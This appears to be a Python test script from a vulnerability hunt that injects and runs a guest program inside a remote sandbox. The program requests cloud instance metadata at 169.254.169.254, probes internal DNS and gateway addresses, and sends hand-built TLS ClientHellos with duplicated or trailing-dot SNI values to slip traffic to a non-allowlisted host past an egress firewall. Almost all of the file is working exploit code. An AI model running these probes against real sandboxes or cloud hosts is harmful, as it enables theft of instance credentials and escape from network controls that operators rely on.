# -*- coding: utf-8 -*-
"""Phase14: custom 下 metadata/内网数据面 + 双 SNI 解析缺陷测试"""
import sys, time, struct
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM

SID = "sbx_t6JtaXKLl6KgZtBFfvzG9JJidoAX"  # fwtest6, custom webhook.site

GUEST = r'''
import socket, struct, time

def raw(ip, port, data, label='', wait=6):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(wait)
        t0 = time.time()
        s.connect((ip, port))
        s.sendall(data)
        try:
            r = s.recv(500)
            print('[%s %s:%d] resp(%.1fs): %r' % (label, ip, port, time.time()-t0, r[:150]), flush=True)
        except socket.timeout:
            print('[%s %s:%d] TIMEOUT(%.1fs)' % (label, ip, port, time.time()-t0), flush=True)
        s.close()
    except Exception as e:
        print('[%s %s:%d] EXC %s: %s' % (label, ip, port, type(e).__name__, e), flush=True)

def tls_sni(ip, port, sni, label=''):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((ip, port))
        n = sni.encode()
        ext = b'\x00\x00' + struct.pack('>H', len(n)+5) + b'\x00' + bytes([len(n)]) + n
        body = b'\x03\x03' + b'\x33'*32 + b'\x00' + b'\x00\x02\x13\x01' + b'\x01\x00'
        body += struct.pack('>H', len(ext)) + ext
        hs = b'\x01' + len(body).to_bytes(3,'big') + body
        s.sendall(b'\x16\x03\x01' + struct.pack('>H', len(hs)) + hs)
        try:
            r = s.recv(200)
            print('[%s %s:%d] resp: %r' % (label, ip, port, r[:40]), flush=True)
        except socket.timeout:
            print('[%s %s:%d] TIMEOUT' % (label, ip, port), flush=True)
        s.close()
    except Exception as e:
        print('[%s %s:%d] EXC %s' % (label, ip, port, e), flush=True)

def tls_dual_sni(ip, port, sni1, sni2, label=''):
    # 两个 server_name 扩展
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(6)
        s.connect((ip, port))
        ext = b''
        for n in (sni1.encode(), sni2.encode()):
            ext += b'\x00\x00' + struct.pack('>H', len(n)+5) + b'\x00' + bytes([len(n)]) + n
        body = b'\x03\x03' + b'\x44'*32 + b'\x00' + b'\x00\x02\x13\x01' + b'\x01\x00'
        body += struct.pack('>H', len(ext)) + ext
        hs = b'\x01' + len(body).to_bytes(3,'big') + body
        s.sendall(b'\x16\x03\x01' + struct.pack('>H', len(hs)) + hs)
        try:
            r = s.recv(200)
            print('[%s %s:%d] resp: %r' % (label, ip, port, r[:40]), flush=True)
        except socket.timeout:
            print('[%s %s:%d] TIMEOUT' % (label, ip, port), flush=True)
        s.close()
    except Exception as e:
        print('[%s %s:%d] EXC %s' % (label, ip, port, e), flush=True)

META = b'GET /latest/meta-data/ HTTP/1.1\r\nHost: 169.254.169.254\r\nConnection: close\r\n\r\n'

# 1) metadata 明文 HTTP (custom 下连接层放行, 数据面?)
raw('169.254.169.254', 80, META, 'meta-plain')
# 2) metadata TLS (SNI=白名单)
tls_sni('169.254.169.254', 80, 'webhook.site', 'meta-tls80')
tls_sni('169.254.169.254', 443, 'webhook.site', 'meta-tls443')
# 3) 内网 DNS TCP 53 (DNS over TCP)
raw('172.31.0.2', 53, b'\x00\x1e\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x0awebhook\x04site\x00\x00\x01\x00\x01', 'dns-tcp')
# 4) 内网 DNS 其他端口明文 HTTP
raw('172.31.0.2', 80, META, 'dns80-plain')
# 5) 网关
raw('100.64.0.1', 80, META, 'gw80-plain')
# 6) 双 SNI: 第一个攻击者, 第二个白名单
tls_dual_sni('34.195.135.204', 443, 'httpbin.org', 'webhook.site', 'dual-np+wh')
# 7) 双 SNI: 第一个白名单, 第二个攻击者
tls_dual_sni('34.195.135.204', 443, 'webhook.site', 'httpbin.org', 'dual-wh+np')
# 8) SNI 尾随点
tls_sni('34.195.135.204', 443, 'webhook.site.', 'dot-sni')
# 9) 对照: 正常 SNI 白名单 (期望 ServerHello 或 EOF? 看代理转发)
tls_sni('178.63.67.153', 443, 'webhook.site', 'ctrl-wh')
# 10) 对照: 正常 SNI 非白名单 (期望拒)
tls_sni('34.195.135.204', 443, 'httpbin.org', 'ctrl-np')
print('done', flush=True)
'''

code = "cat > /tmp/pg22.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg22.py"

if __name__ == "__main__":
    c, r = cmd(SID, "bash", ["-lc", code], timeout_ms=120000)
    print('cmd:', c, flush=True)
    print(r[:5500], flush=True)
